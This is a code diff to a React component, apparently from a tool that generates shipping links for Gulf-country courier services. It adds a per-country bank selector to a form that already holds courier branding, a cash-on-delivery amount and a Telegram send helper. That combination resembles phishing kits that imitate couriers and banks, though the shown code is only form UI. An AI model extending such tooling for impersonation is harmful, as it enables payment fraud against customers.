@@ -9,7 +9,8 @@ import { useCreateLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { getServicesByCountry } from "@/lib/gccShippingServices";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { Package, MapPin, DollarSign, Hash } from "lucide-react";
+import { getBanksByCountry } from "@/lib/banks";
+import { Package, MapPin, DollarSign, Hash, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import TelegramTest from "@/components/TelegramTest";
@@ -26,6 +27,10 @@ const CreateShippingLink = () => {
   const [trackingNumber, setTrackingNumber] = useState("");
   const [packageDescription, setPackageDescription] = useState("");
   const [codAmount, setCodAmount] = useState("");
+  const [selectedBank, setSelectedBank] = useState("");
+  
+  // Get banks for the selected country
+  const banks = useMemo(() => getBanksByCountry(country || ""), [country]);
   
   // Get selected service details and branding
   const selectedServiceData = useMemo(() => 
@@ -60,6 +65,7 @@ const CreateShippingLink = () => {
           tracking_number: trackingNumber,
           package_description: packageDescription,
           cod_amount: parseFloat(codAmount) || 0,
+          selected_bank: selectedBank || null,
         },
       });
       
@@ -216,6 +222,30 @@ const CreateShippingLink = () => {
                   step="0.01"
                   min="0"
                 />
+              </div>
+              
+              {/* Bank Selection */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm">
+                  <Building2 className="w-3 h-3" />
+                  البنك (اختياري)
+                </Label>
+                <Select value={selectedBank} onValueChange={setSelectedBank}>
+                  <SelectTrigger className="h-9">
+                    <SelectValue placeholder="اختر البنك" />
+                  </SelectTrigger>
+                  <SelectContent className="bg-background z-50">
+                    <SelectItem value="">بدون تحديد</SelectItem>
+                    {banks.map((bank) => (
+                      <SelectItem key={bank.id} value={bank.id}>
+                        {bank.nameAr}
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
+                <p className="text-xs text-muted-foreground mt-1">
+                  اختر البنك المفضل للعميل (يمكن تركه فارغاً)
+                </p>
               </div>
               
               {/* Submit Button */}
